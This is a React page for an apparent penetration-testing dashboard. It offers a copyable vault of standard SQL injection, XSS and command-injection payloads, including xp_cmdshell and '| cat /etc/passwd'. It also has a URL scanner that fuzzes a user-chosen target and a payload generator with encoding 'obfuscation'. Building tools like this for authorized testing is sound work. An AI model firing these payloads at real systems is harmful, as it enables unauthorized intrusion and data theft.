"use client";

import { useState } from "react";
import { Sidebar } from "../../components/DashboardComponents";

const PAYLOADS = {
    "SQL Injection (Auth Bypass)": [
        "' OR '1'='1",
        "admin' --",
        "admin' #",
        "' OR 1=1--",
        "' UNION SELECT 1, 'admin', 'password'--",
    ],
    "SQL Injection (Error Based)": [
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "'; EXEC xp_cmdshell('dir');--",
    ],
    "XSS (Cross Site Scripting)": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
    ],
    "Command Injection": [
        "; ls -la",
        "| cat /etc/passwd",
        "& ping -c 10 127.0.0.1",
    ]
};

export default function SQLiTesterPage() {
    const [copied, setCopied] = useState(null);
    const [mode, setMode] = useState('vault');

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        setCopied(text);
        setTimeout(() => setCopied(null), 2000);
    };

    return (
        <div className="min-h-screen bg-[#050505] text-[#e0e0e0] font-mono flex relative overflow-hidden">
            <div className="lightning-bg"></div>
            <Sidebar />
            <main className="flex-1 p-8 relative z-10">
                <div className="laser-line"></div>

                <div className="max-w-6xl mx-auto">
                    <div className="mb-12 border-b border-[#00ff88]/20 pb-8 flex flex-col md:flex-row justify-between items-end gap-6">
                        <div>
                            <h1 className="text-6xl font-black text-white tracking-tighter mb-4 animate-in slide-in-from-left duration-700">
                                SQLi_<span className="text-[#00ff88]">TESTER</span>
                            </h1>
                            <div className="flex items-center gap-3 text-gray-500 font-bold text-xs uppercase tracking-[0.4em]">
                                <span className="w-2 h-2 bg-red-500 rounded-full animate-ping"></span>
                                INJECTION_VECTOR_MODULE // ACTIVE
                            </div>
                        </div>

                        <div className="flex gap-2 bg-white/5 p-1 rounded-xl border border-white/5 shadow-2xl">
                            {['vault', 'scanner', 'generator'].map((m) => (
                                <button
                                    key={m}
                                    onClick={() => setMode(m)}
                                    className={`px-8 py-3 text-[10px] font-black tracking-widest uppercase transition-all rounded-lg ${mode === m
                                        ? 'bg-[#00ff88] text-black shadow-[0_0_25px_rgba(0,255,136,0.4)] scale-105'
                                        : 'text-gray-500 hover:text-white hover:bg-white/5'}`}
                                >
                                    {m}
                                </button>
                            ))}
                        </div>
                    </div>

                    <div className="transition-all duration-500">
                        {mode === 'vault' ? (
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-8 animate-in fade-in slide-in-from-bottom-5">
                                {Object.entries(PAYLOADS).map(([category, items]) => (
                                    <div key={category} className="glass-card-extreme p-8 cyber-border-extreme relative overflow-hidden group">
                                        <div className="absolute top-0 right-0 p-3 opacity-10 text-4xl grayscale group-hover:grayscale-0 transition-all duration-500">💉</div>
                                        <h2 className="text-[#00ff88] text-xs font-black mb-8 tracking-[0.3em] uppercase flex items-center gap-3">
                                            <div className="w-2 h-2 bg-[#00ff88] rounded-full shadow-[0_0_10px_#00ff88]"></div>
                                            {category}
                                        </h2>
                                        <div className="space-y-3">
                                            {items.map((payload, idx) => (
                                                <div key={idx} className="flex justify-between items-center bg-black/60 p-4 rounded-xl border border-white/5 group hover:border-[#00ff88]/30 transition-all">
                                                    <code className="text-[10px] text-gray-400 font-mono truncate mr-4">{payload}</code>
                                                    <button
                                                        onClick={() => copyToClipboard(payload)}
                                                        className={`text-[8px] font-black px-4 py-2 rounded-lg transition-all ${copied === payload ? 'bg-[#00ff88] text-black' : 'bg-white/5 text-gray-500 hover:text-white hover:bg-white/10'}`}
                                                    >
                                                        {copied === payload ? 'COPIED' : 'EXTRACT'}
                                                    </button>
                                                </div>
                                            ))}
                                        </div>
                                    </div>
                                ))}
                            </div>
                        ) : mode === 'scanner' ? (
                            <div className="animate-in zoom-in-95 duration-700">
                                <ScannerComponent />
                            </div>
                        ) : (
                            <div className="animate-in slide-in-from-right-10 duration-700">
                                <PolyglotGenerator />
                            </div>
                        )}
                    </div>

                    <div className="mt-20 p-8 border-2 border-red-500/20 bg-gradient-to-r from-red-950/20 to-transparent rounded-3xl flex items-center gap-8 shadow-[0_0_60px_rgba(239,68,68,0.05)]">
                        <span className="text-5xl animate-pulse">☣️</span>
                        <div>
                            <div className="text-red-500 text-xs font-black uppercase tracking-[0.2em] mb-1">UNAUTHORIZED_ACCESS_WARNING</div>
                            <div className="text-[10px] font-bold text-red-500/60 uppercase tracking-widest leading-relaxed">
                                This module is for authorized penetration testing only.
                                Unauthorized use against external systems is a violation of international cyber-security laws.
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
    );
}

function ScannerComponent() {
    const [url, setUrl] = useState('');
    const [loading, setLoading] = useState(false);
    const [results, setResults] = useState(null);

    const scan = async () => {
        if (!url) return;
        setLoading(true);
        setResults(null);
        try {
            const res = await fetch('/api/sqli-scanner', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ url })
            });
            const data = await res.json();
            setResults(data);
        } catch (e) {
            setResults({ error: "Scan failed. Link to uplink severed." });
        } finally {
            setLoading(false);
        }
    };

    const exportPDF = () => {
        if (!results || results.error) return;
        const doc = new jsPDF();

        // Premium Header
        doc.setFillColor(5, 5, 5);
        doc.rect(0, 0, 210, 40, 'F');
        doc.setTextColor(0, 255, 136);
        doc.setFontSize(28);
        doc.text("BYTEGUARD", 20, 25);
        doc.setFontSize(10);
        doc.setTextColor(150, 150, 150);
        doc.text("CRITICAL_VULNERABILITY_REPORT // SQL_INJECTION", 20, 32);

        doc.setTextColor(0, 0, 0);
        doc.setFontSize(14);
        doc.text(`TARGET: ${results.url}`, 20, 50);

        doc.setFontSize(12);
        doc.text(`STATUS: ${results.vulnerable ? 'CRITICAL - VULNERABLE' : 'SECURE'}`, 20, 60);
        doc.text(`DATE: ${new Date().toLocaleString()}`, 20, 70);

        if (results.details && results.details.length > 0) {
            let y = 85;
            doc.text("CONFIRMED EXPLOIT VECTORS:", 20, 80);
            results.details.forEach((item, i) => {
                if (y > 270) { doc.addPage(); y = 20; }
                doc.setFontSize(10);
                doc.setTextColor(255, 0, 0);
                doc.text(`${i + 1}. TYPE: ${item.type}`, 20, y);
                doc.setTextColor(0, 0, 0);
                doc.text(`   PARAM: ${item.param}`, 20, y + 6);
                doc.text(`   PAYLOAD: ${item.payload}`, 20, y + 12);
                doc.setFontSize(8);
                doc.setTextColor(100, 100, 100);
                doc.text(`   EVIDENCE: ${item.evidence}`, 20, y + 18);
                y += 28;
            });
        }

        doc.save(`sqli_report_${new Date().getTime()}.pdf`);
    };

    return (
        <div className="glass-card-extreme p-12 cyber-border-extreme max-w-4xl mx-auto relative overflow-hidden">
            {loading && <div className="scanner-overlay !bg-[#00ff88] !opacity-20 animate-scan"></div>}

            <div className="relative z-10">
                <div className="flex justify-between items-start mb-12">
                    <div>
                        <h2 className="text-white text-3xl font-black mb-2 tracking-tighter italic uppercase tracking-wider">Automated_<span className="text-[#00ff88]">Fuzzer</span></h2>
                        <p className="text-gray-500 text-[10px] font-bold uppercase tracking-[0.4em] italic">Neural Injection_Scanner // Surface Recon</p>
                    </div>
                    {results && !results.error && (
                        <button onClick={exportPDF} className="btn-futuristic !py-2 !px-4 !text-[8px] animate-in fade-in zoom-in">
                            EXPORT_REPORT
                        </button>
                    )}
                </div>

                <div className="space-y-6">
                    <div className="relative group">
                        <input
                            type="text"
                            value={url}
                            onChange={(e) => setUrl(e.target.value)}
                            placeholder="TARGET_ENDPOINT_ [e.g. ?id=1]"
                            className="w-full bg-black/80 border-2 border-[#00ff88]/20 rounded-2xl p-6 text-white text-xl focus:outline-none focus:border-[#00ff88] transition-all font-black"
                        />
                        <div className="absolute right-6 top-1/2 -translate-y-1/2 text-[10px] text-[#00ff88]/30 font-black group-hover:text-[#00ff88] transition-colors">URL</div>
                    </div>
                    <button
                        onClick={scan}
                        disabled={loading}
                        className="btn-floating-extreme !py-6 !text-lg !scale-100 hover:!scale-[1.02]"
                    >
                        {loading ? 'EXECUTING FUZZ_SEQUENCE...' : 'INITIATE SURFACE ATTACK'}
                    </button>
                </div>

                {results && (
                    <div className="mt-12 space-y-8 animate-in slide-in-from-top-4 duration-500">
                        {results.error ? (
                            <div className="text-red-500 bg-red-500/5 p-8 rounded-3xl border-2 border-red-500/30 text-[10px] font-black uppercase tracking-[0.3em] flex items-center gap-6">
                                <span className="text-3xl">🚫</span> {results.error}
                            </div>
                        ) : (
                            <div className="space-y-8">
                                <div className="flex justify-between items-center glass-card-extreme p-8 border-[#00ff88]/10 backdrop-blur-xl">
                                    <div className="flex-1 overflow-hidden">
                                        <div className="text-gray-600 text-[10px] font-black uppercase mb-2 tracking-widest">Target Identity</div>
                                        <div className="text-white font-mono text-sm truncate italic font-black uppercase tracking-wider">{results.url}</div>
                                    </div>
                                    <div className="text-right pl-8 ml-8 border-l border-white/5">
                                        <div className="text-gray-600 text-[10px] font-black uppercase mb-2 tracking-widest">Compromise Status</div>
                                        <div className={`text-2xl font-black italic tracking-tighter ${results.vulnerable ? 'text-red-500 animate-pulse' : 'text-[#00ff88]'}`}>
                                            {results.vulnerable ? 'VULNERABLE' : 'SECURE'}
                                        </div>
                                    </div>
                                </div>

                                {results.details && results.details.length > 0 && results.vulnerable && (
                                    <div className="space-y-6">
                                        <h3 className="text-red-500 text-[10px] font-black uppercase tracking-[0.8em] mb-6 text-center italic">Detected_Exploit_Vectors</h3>
                                        <div className="grid grid-cols-1 gap-6">
                                            {results.details.map((item, i) => (
                                                <div key={i} className="glass-card-extreme p-8 border-red-500/20 bg-red-950/5 group hover:border-red-500/60 transition-all duration-500">
                                                    <div className="flex justify-between items-center mb-6">
                                                        <div className="flex items-center gap-4">
                                                            <span className="bg-red-500 text-black text-[10px] font-black px-4 py-1 rounded-full uppercase italic">{item.type}</span>
                                                            <span className="text-white/40 text-[10px] font-black uppercase tracking-widest">Vector: {item.param}</span>
                                                        </div>
                                                        <div className="text-red-500 text-[10px] font-black border border-red-500/30 px-3 py-1 rounded italic uppercase">High Risk</div>
                                                    </div>
                                                    <div className="bg-black/60 p-6 rounded-2xl border border-red-500/10 mb-4 group-hover:border-red-500/30 transition-all">
                                                        <div className="text-[10px] text-gray-500 font-black mb-2 uppercase italic tracking-widest">Active Payload:</div>
                                                        <code className="text-red-400 text-[11px] font-mono whitespace-pre-wrap break-all leading-relaxed">{item.payload}</code>
                                                    </div>
                                                    <div className="text-red-400/40 text-[9px] font-black uppercase tracking-[0.2em] italic">EVIDENCE_LOG: {item.evidence}</div>
                                                </div>
                                            ))}
                                        </div>
                                    </div>
                                )}

                                {!results.vulnerable && !results.error && (
                                    <div className="glass-card-extreme p-16 border-[#00ff88]/20 bg-[#00ff88]/5 flex flex-col items-center gap-6 text-center">
                                        <div className="text-6xl animate-pulse">🛡️</div>
                                        <div>
                                            <span className="text-white text-xl font-black uppercase tracking-[0.4em] block mb-2">Zero Vulnerabilities</span>
                                            <span className="text-gray-500 text-[9px] font-black uppercase tracking-[0.3em]">No injection vectors detected in primary surface fuzzing. Target integrity intact.</span>
                                        </div>
                                    </div>
                                )}
                            </div>
                        )}
                    </div>
                )}
            </div>
        </div>
    );
}

function PolyglotGenerator() {
    const [base, setBase] = useState("' OR 1=1");
    const [suffix, setSuffix] = useState("-- -");
    const [encoding, setEncoding] = useState("none");

    const generate = () => {
        let payload = `${base} ${suffix}`;
        if (encoding === "url") payload = encodeURIComponent(payload);
        if (encoding === "double") payload = encodeURIComponent(encodeURIComponent(payload));
        if (encoding === "base64") payload = btoa(payload);
        return payload;
    };

    return (
        <div className="glass-card-extreme p-12 cyber-border-extreme max-w-4xl mx-auto shadow-[0_0_80px_rgba(0,0,0,0.6)] relative overflow-hidden group">
            <div className="absolute top-0 right-0 p-4 opacity-5 text-8xl grayscale group-hover:opacity-20 transition-all duration-1000">🏗️</div>

            <h2 className="text-white text-4xl font-black mb-2 tracking-tighter uppercase italic tracking-wider">Payload_<span className="text-[#00ff88]">Smith</span></h2>
            <p className="text-gray-500 text-[10px] font-bold uppercase tracking-[0.6em] mb-16 italic">Logic Forge // Encoding_Engine</p>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-12">
                <div className="space-y-10">
                    <div className="relative">
                        <label className="block text-gray-600 text-[10px] font-black mb-4 uppercase tracking-[0.3em] flex items-center gap-2">
                            <div className="w-1.5 h-1.5 bg-[#00ff88] rounded-full"></div>
                            Injection Logic Base
                        </label>
                        <select value={base} onChange={e => setBase(e.target.value)} className="w-full bg-black/60 border-2 border-white/5 rounded-2xl p-5 text-white text-sm focus:border-[#00ff88] outline-none transition-all font-black uppercase tracking-widest">
                            <option value="' OR '1'='1">Auth Bypass (&apos; OR &apos;1&apos;=&apos;1)</option>
                            <option value="' UNION SELECT 1,version(),3">Union Based (version retrieval)</option>
                            <option value="'; STOP; --">Stacking Queries (STOP)</option>
                            <option value="SLEEP(10) /*">Time Based (SLEEP 10)</option>
                            <option value="1 AND 1=1">Boolean True</option>
                        </select>
                    </div>

                    <div className="relative">
                        <label className="block text-gray-600 text-[10px] font-black mb-4 uppercase tracking-[0.3em] flex items-center gap-2">
                            <div className="w-1.5 h-1.5 bg-[#00ff88] rounded-full"></div>
                            Suffix Termination
                        </label>
                        <select value={suffix} onChange={e => setSuffix(e.target.value)} className="w-full bg-black/60 border-2 border-white/5 rounded-2xl p-5 text-white text-sm focus:border-[#00ff88] outline-none transition-all font-black uppercase tracking-widest">
                            <option value="-- -">Standard MySQL (-- -)</option>
                            <option value="#">Hash (#)</option>
                            <option value="/*">Block Comment (/*)</option>
                            <option value=";--">Terminator (;--)</option>
                        </select>
                    </div>
                </div>

                <div className="space-y-10">
                    <div>
                        <label className="block text-gray-600 text-[10px] font-black mb-6 uppercase tracking-[0.3em] flex items-center gap-2">
                            <div className="w-1.5 h-1.5 bg-[#00ff88] rounded-full shadow-[0_0_10px_#00ff88]"></div>
                            Obfuscation Layers
                        </label>
                        <div className="grid grid-cols-2 gap-4">
                            {['none', 'url', 'double', 'base64'].map(enc => (
                                <button
                                    key={enc}
                                    onClick={() => setEncoding(enc)}
                                    className={`px-4 py-4 rounded-xl border-2 text-[10px] font-black tracking-widest uppercase transition-all ${encoding === enc
                                        ? 'bg-[#00ff88] text-black border-[#00ff88] shadow-[0_0_20px_rgba(0,255,136,0.4)] scale-105'
                                        : 'bg-black text-gray-600 border-white/5 hover:border-[#00ff88]/40 hover:text-white'}`}
                                >
                                    {enc}
                                </button>
                            ))}
                        </div>
                    </div>

                    <div className="p-8 bg-black/60 border-2 border-[#00ff88]/20 rounded-3xl relative group hover:border-[#00ff88]/50 transition-all duration-500 shadow-inner">
                        <div className="absolute top-4 right-4 text-[9px] text-[#00ff88] font-black uppercase tracking-widest animate-pulse">Obfuscated_Vector</div>
                        <label className="block text-[#00ff88] text-[10px] mb-4 font-black uppercase tracking-[0.4em] italic">Forged Payload</label>
                        <div className="min-h-[100px] flex items-center mb-6">
                            <code className="text-white text-sm font-mono break-all leading-relaxed p-4 rounded-xl w-full bg-white/5 backdrop-blur-md shadow-inner">{generate()}</code>
                        </div>
                        <button
                            onClick={() => {
                                navigator.clipboard.writeText(generate());
                                // Small feedback could be added here
                            }}
                            className="w-full py-4 bg-[#00ff88]/10 text-[#00ff88] text-[9px] font-black uppercase rounded-xl border border-[#00ff88]/20 hover:bg-[#00ff88] hover:text-black transition-all shadow-lg active:scale-95"
                        >
                            COPY_FORGED_VECTOR
                        </button>
                    </div>
                </div>
            </div>
        </div>
    );
}
